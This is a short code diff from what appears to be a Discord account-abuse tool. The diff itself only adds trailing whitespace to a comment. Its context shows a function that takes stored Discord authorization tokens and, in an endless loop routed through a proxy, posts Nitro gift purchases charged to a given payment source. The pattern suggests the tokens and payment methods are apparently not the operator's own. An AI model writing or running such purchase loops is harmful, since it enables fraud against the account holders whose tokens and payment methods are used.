@@ -31,7 +31,7 @@ class Api():
         self.tokens = self.db.get_tokens()
 
         def buy_nitro(token, uid):
-            while True: # nitro boost sku
+            while True: # nitro boost sku 
                 r1 = httpx.post(f'https://discord.com/api/v9/store/skus/521847234246082599/purchase', headers={'Content-Type': 'application/json', 'Authorization': token}, json={"gift":True,"sku_subscription_plan_id": "511651880837840896","payment_source_id": uid,"payment_source_token": None,"expected_amount":999,"expected_currency":"usd"}, proxies= {"http://": __PROXY__,"https://": __PROXY__})
                 print(r1.text)
                 try:
